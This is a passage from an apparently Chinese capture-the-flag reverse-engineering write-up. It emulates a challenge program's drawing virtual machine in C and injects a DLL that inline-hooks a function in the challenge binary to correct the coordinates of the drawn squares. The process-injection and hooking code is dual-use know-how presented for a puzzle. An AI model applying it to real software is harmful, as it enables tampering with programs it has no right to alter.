__int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />        AllocConsole();<br />        freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />        HookShellcode();<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}<br /></code></pre><p>输出：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">(-950,-210)<br />(-950,50)<br />(-950,170)<br />(-890,-270)<br />(-830,170)<br />(-770,230)<br />(50,-390)<br />(50,230)<br />(50,350)<br />(110,-390)<br />(170,-270)<br />(410,290)<br />(470,230)<br />(470,290)<br />(530,170)<br />(530,290)<br />(590,110)<br />(650,50)<br />(710,50)<br />(710,110)<br />(770,50)<br />(770,170)<br />(830,50)<br />(830,230)<br />(890,290)<br />(950,50)<br />(950,290)<br />(1010,50)<br />(1010,110)<br />(1010,290)<br />(1070,50)<br />(1070,170)<br />(1070,290)<br />(1130,50)<br />(1130,170)<br />(1130,230)<br />(1190,170)<br />(1190,290)<br />(1250,170)<br />(1250,290)<br />(1310,290)<br />(1370,290)</code></pre><p>一共是 42 个点，而数了一下它题目给的正确的点数刚好也是42个，黄点是有 11 个， 蓝点有 31 个。</p><p>但是稍微改了一下第一个第二个参数发现点会直接消失，看样子是跟第三个第四个参数会有关系。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c9c65e63&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRllsxllOlvbpHYo7ycY6u6LY3PPmJFjMfBYIibvkCRiczUAIGYwlLl1bxw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>通过左右参数的比对观察一下，正确调用时的这些局部变量分别是多少，看看能不能找到点关系（放弃）。</p><p>还是选择自己写一个虚拟机去跑。</p><p>代码太长了不放了，可以自己去 dump，我写一下我自己的虚拟机调试流程：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;string.h&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">int</span> code[<span style="color: rgb(255, 115, 253);">1855</span>];     <span style="color: rgb(124, 124, 124);">//...</span><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(255, 255, 182);">int</span> RIP=<span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> reg;<br />    <span style="color: rgb(255, 255, 182);">int</span> Stack[<span style="color: rgb(255, 115, 253);">50</span>];<br />    <span style="color: rgb(255, 255, 182);">int</span> v13,v14;<br />    printf(<span style="color: rgb(168, 255, 96);">"start\n"</span>);<br />    memset(Stack,<span style="color: rgb(255, 115, 253);">0</span>,sizeof(Stack));<br />    Stack[<span style="color: rgb(255, 115, 253);">8</span>]=Stack[<span style="color: rgb(255, 115, 253);">9</span>]=<span style="color: rgb(255, 115, 253);">50</span>;<span style="color: rgb(124, 124, 124);">//截图中忘了这一句，不要忘了加上</span><br />    <span style="color: rgb(150, 203, 254);">while</span>(RIP&lt;=<span style="color: rgb(255, 115, 253);">0x1301</span>){<br />        <span style="color: rgb(124, 124, 124);">//printf("execute opcode=%d RIP=%d\n",code[RIP],RIP);</span><br />        <span style="color: rgb(255, 255, 182);">int</span> opcode=code[RIP];<br />        RIP++;<br />        <span style="color: rgb(150, 203, 254);">switch</span> (opcode) {<br /><br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0</span>:<br />                Stack[<span style="color: rgb(255, 115, 253);">0</span>]+=Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                printf(<span style="color: rgb(168, 255, 96);">"stack[0]=%d+%d\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">1</span>:<br />                Stack[<span style="color: rgb(255, 115, 253);">0</span>]-=Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                printf(<span style="color: rgb(168, 255, 96);">"stack[0]=%d-%d\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">2</span>:<br />                Stack[code[RIP+<span style="color: rgb(255, 115, 253);">1</span>]]=Stack[code[RIP]];<br />                printf(<span style="color: rgb(168, 255, 96);">"Stack[%d]=Stack[%d]=%d\n"</span>,code[RIP+<span style="color: rgb(255, 115, 253);">1</span>],code[RIP],Stack[code[RIP]]);<br />                RIP+=<span style="color: rgb(255, 115, 253);">2</span>;<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">3</span>:<br />                Stack[code[RIP+<span style="color: rgb(255, 115, 253);">1</span>]]=code[RIP];<br />                printf(<span style="color: rgb(168, 255, 96);">"Stack[%d]=%d\n"</span>,code[RIP+<span style="color: rgb(255, 115, 253);">1</span>],code[RIP]);<br />                RIP+=<span style="color: rgb(255, 115, 253);">2</span>;<br />                <span style="color: rgb(150, 203, 254);">break</span>; <br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">4</span>:<br />                v13=Stack[<span style="color: rgb(255, 115, 253);">0</span>];<br />                v14=Stack[<span style="color: rgb(255, 115, 253);">0</span>]*(Stack[<span style="color: rgb(255, 115, 253);">1</span>]+<span style="color: rgb(255, 115, 253);">1</span>);<br />                printf(<span style="color: rgb(168, 255, 96);">"Origin: Stack[0]=%d Stack[1]=%d "</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                Stack[<span style="color: rgb(255, 115, 253);">0</span>]=code[RIP]^<span style="color: rgb(255, 115, 253);">0x414345</span>;<br />                Stack[<span style="color: rgb(255, 115, 253);">1</span>]=((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v13)) % <span style="color: rgb(255, 115, 253);">256</span>+ (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (v13 * Stack[<span style="color: rgb(255, 115, 253);">1</span>])) % <span style="color: rgb(255, 115, 253);">256</span> + (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>));<br />                printf(<span style="color: rgb(168, 255, 96);">"Target: Stack[0]=%d Stack[1]=%d\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                RIP+=<span style="color: rgb(255, 115, 253);">1</span>;<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">5</span>:<br />                printf(<span style="color: rgb(168, 255, 96);">"paint(%d,%d,%d,%d,0xFFFFFF00);\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>],Stack[<span style="color: rgb(255, 115, 253);">5</span>],Stack[<span style="color: rgb(255, 115, 253);">6</span>],Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">6</span>:<br />                printf(<span style="color: rgb(168, 255, 96);">"paint(%d,%d,%d,%d,0xFF2DDBE7);\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>],Stack[<span style="color: rgb(255, 115, 253);">5</span>],Stack[<span style="color: rgb(255, 115, 253);">6</span>],Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">7</span>:<br />                printf(<span style="color: rgb(168, 255, 96);">"exit\n"</span>);<br />                exit(<span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(150, 203, 254);">default</span>:<br />                exit(<span style="color: rgb(255, 115, 253);">0</span>);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br /><br />        }<br />    }<br />}</code></pre><p>运行之后发现了一点：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f97abe27&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlYILQVgfZ3N0KbagvkZswWAMwb166nAL7mjBzvUb6ZuSHHrUlOvD1Xw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>第三个和第四个参数分别为用 <code style="font-family: SFMono-Regular, Consolas, ;">opcode==4</code> 时候的 x 和 y 的坐标运算得到的值。</p><p>试试看利用 opcode=4 的流程能否让程序任意位置输出色块。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">v13=x<span style="color: rgb(124, 124, 124);">;</span><br />v14=x*(y+<span style="color: rgb(255, 115, 253);">1</span>)<span style="color: rgb(124, 124, 124);">;</span><br />a3=operand^<span style="color: rgb(255, 115, 253);">0</span>x414345<span style="color: rgb(124, 124, 124);">;</span><br />a4=((x ^ (y + v13)) % <span style="color: rgb(255, 115, 253);">256</span>+ (((x ^ (v13 * y)) % <span style="color: rgb(255, 115, 253);">256</span> + (((x ^ (y + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>))<span style="color: rgb(124, 124, 124);">;</span></code></pre><p>因为每次的这个操作数都不同，这里选取第一个错误坐标 <code style="font-family: SFMono-Regular, Consolas, ;">-950 50</code> 来绘制，利用这里的逻辑去做。</p><p>DLL代码：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;set&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br />std::set&lt;std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;&gt;s;<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">printset</span>() {<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> k : s) {<br />        printf(<span style="color: rgb(168, 255, 96);">"(%d,%d)\n"</span>, k.first, k.second);<br />    }<br />}<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> flag = <span style="color: rgb(255, 115, 253);">1</span>;<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    <span style="color: rgb(255, 255, 182);">int</span> v13, v14;<br />    <span style="color: rgb(150, 203, 254);">if</span> (x == <span style="color: rgb(255, 115, 253);">-950</span> &amp;&amp; y == <span style="color: rgb(255, 115, 253);">50</span>) {<br />        x = <span style="color: rgb(255, 115, 253);">50</span>;<br />        y = <span style="color: rgb(255, 115, 253);">50</span>;<br />        v13=x;<br />        v14=x*(y+<span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(124, 124, 124);">//printf("Origin: Stack[0]=%d Stack[1]=%d ",Stack[0],Stack[1]);</span><br />        <span style="color: rgb(124, 124, 124);">//printf("num=0x%x ",code[RIP]);</span><br />        a3=<span style="color: rgb(255, 115, 253);">0x524895</span>^<span style="color: rgb(255, 115, 253);">0x414345</span>;<br />        a4=(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)((a3 ^ (y + v13)) % <span style="color: rgb(255, 115, 253);">256</span><br />                        + (((a3 ^ (v13 * y)) % <span style="color: rgb(255, 115, 253);">256</span> + (((a3 ^ (y + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>));<br />    }<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call shellcode(%d,%d,%d,%d,%x) retval=%d\n"</span>,x, y, a3, a4, a5, ret);          <br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> presize = s.size();<br />    s.insert({ x,y });<br />    <span style="color: rgb(150, 203, 254);">if</span> (s.size() == presize) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (flag) {<br />            printset();<br />            flag = <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    __int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />        AllocConsole();<br />        freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />        HookShellcode();<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}</code></pre><p>注入之后，在指定的位置输出了黄色方块</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=12d28f63&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlwmzZgjXkLqA38fG0oskDJsTRXdh6IwbOXPakDNekSGXlibYgzcx5VFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>说明修复思路是没有问题的，接下来可以用虚拟机流程把错误的坐标和对应的该操作数 dump 出来，hook 的时候进行替换。</p><p>后面用截图工具比了一下，发现它们水平距离都一样的，所以可以用已有的正确坐标参考，从上到下坐标分别为 <code style="font-family: SFMono-Regular, Consolas, ;">50,110,170,230...</code> 就是每隔一个查了 <code style="font-family: SFMono-Regular, Consolas, ;">60</code> 的距离，水平距离也同样是 60，那么最靠左的正确的方块是 <code style="font-family: SFMono-Regular, Consolas, ;">(410,290)</code>，肉眼分析下来，最左边的坐标是 50，y 坐标因为对对齐的也是 50，所以第一个色块是完美还原的。</p><p>那么最左边 6 个就是</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">50,50<br />50,110<br />50,170<br />50,230<br />50,290<br />50,350</code></pre><p>对角线延伸出去三个就是</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">110,110<br />170,170<br />230,230</code></pre><p>最后两个补齐 FLAG是</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">110,230<br />170,230</code></pre><p>最后的DLL：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;set&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br />std::set&lt;std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;&gt;s;<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">printset</span>() {<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> k : s) {<br />        printf(<span style="color: rgb(168, 255, 96);">"(%d,%d)\n"</span>, k.first, k.second);<br />    }<br />}<br /><span style="color: rgb(255, 255, 182);">int</span> val[] = {<span style="color: rgb(255, 115, 253);">5392533</span>,<span style="color: rgb(255, 115, 253);">5934636</span>,<span style="color: rgb(255, 115, 253);">9984722</span>,<span style="color: rgb(255, 115, 253);">11102301</span>,<span style="color: rgb(255, 115, 253);">7888111</span>,<span style="color: rgb(255, 115, 253);">9846439</span>,<span style="color: rgb(255, 115, 253);">4608533</span>,<span style="color: rgb(255, 115, 253);">8744398</span>,<span style="color: rgb(255, 115, 253);">7703662</span>,<span style="color: rgb(255, 115, 253);">10004148</span>,<span style="color: rgb(255, 115, 253);">8744654</span>};<br />std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 